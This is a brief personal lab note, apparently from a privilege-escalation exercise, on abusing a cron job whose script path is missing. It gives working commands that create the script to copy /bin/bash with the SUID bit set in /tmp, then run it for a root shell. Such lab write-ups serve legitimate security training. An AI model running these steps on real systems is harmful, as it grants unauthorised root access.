# Detection
---
- `cat /etc/crontab`
	- ![[Pasted image 20250430151627.png]]
- ![[Pasted image 20250430151653.png]]

# Exploitation
---
- `overwrite.sh`does not exist, so we can created it 
	- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
	- `chmod +x overwrite.sh`
- ![[Pasted image 20250430152454.png]]
- `./bash -p`
	- ![[Pasted image 20250430152517.png]]